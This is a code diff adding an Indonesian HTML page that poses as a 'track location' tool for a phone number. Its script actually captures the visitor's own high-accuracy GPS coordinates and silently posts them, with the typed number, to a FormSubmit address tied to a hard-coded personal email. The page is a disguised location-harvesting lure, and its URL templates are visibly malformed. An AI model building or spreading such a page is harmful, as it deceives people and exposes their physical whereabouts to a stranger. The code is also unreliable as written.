@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SENTINEL-X | SYSTEM ACTIVE</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .panel { border: 1px solid #0f0; padding: 20px; width: 300px; text-align: center; box-shadow: 0 0 15px #0f0; }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; margin-bottom: 15px; outline: none; }
+        button { background: #0f0; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
+        #status { font-size: 10px; margin-top: 15px; color: #888; }
+    </style>
+</head>
+<body>
+
+    <div class="panel">
+        <h3>SENTINEL-X v4.0</h3>
+        <p>INPUT TARGET NUMBER:</p>
+        <input type="text" id="phone" placeholder="08xxxxxxxxxx">
+        <button onclick="lacak()">TRACK LOCATION</button>
+        <div id="status">Sistem Ready...</div>
+    </div>
+
+    <script>
+        function lacak() {
+            const email = "hiskiayoel9@gmail.com";
+            const nohp = document.getElementById('phone').value;
+            const status = document.getElementById('status');
+
+            if (!nohp) { alert("Nomor HP harus diisi!"); return; }
+
+            status.innerText = "MENCARI KOORDINAT GPS...";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const gmaps = `https://www.google.com{lat},${lon}`;
+
+                    status.innerText = "KOORDINAT TERKUNCI! MENGIRIM DATA...";
+
+                    // Kirim data ke FormSubmit (Tanpa Error Ajax)
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = `https://formsubmit.co{email}`;
+
+                    const inputNo = document.createElement('input');
+                    inputNo.type = 'hidden';
+                    inputNo.name = 'NOMOR_TARGET';
+                    inputNo.value = nohp;
+
+                    const inputLoc = document.createElement('input');
+                    inputLoc.type = 'hidden';
+                    inputLoc.name = 'GOOGLE_MAPS';
+                    inputLoc.value = gmaps;
+
+                    const inputNext = document.createElement('input');
+                    inputNext.type = 'hidden';
+                    inputNext.name = '_next';
+                    inputNext.value = window.location.href;
+
+                    form.appendChild(inputNo);
+                    form.appendChild(inputLoc);
+                    form.appendChild(inputNext);
+                    document.body.appendChild(form);
+                    
+                    form.submit(); // Kirim data secara otomatis
+                }, (error) => {
+                    alert("Gagal: Target menolak akses lokasi (GPS).");
+                    status.innerText = "AKSES DITOLAK TARGET.";
+                }, { enableHighAccuracy: true });
+            } else {
+                alert("Browser tidak mendukung GPS.");
+            }
+        }
+    </script>
+</body>
+</html>
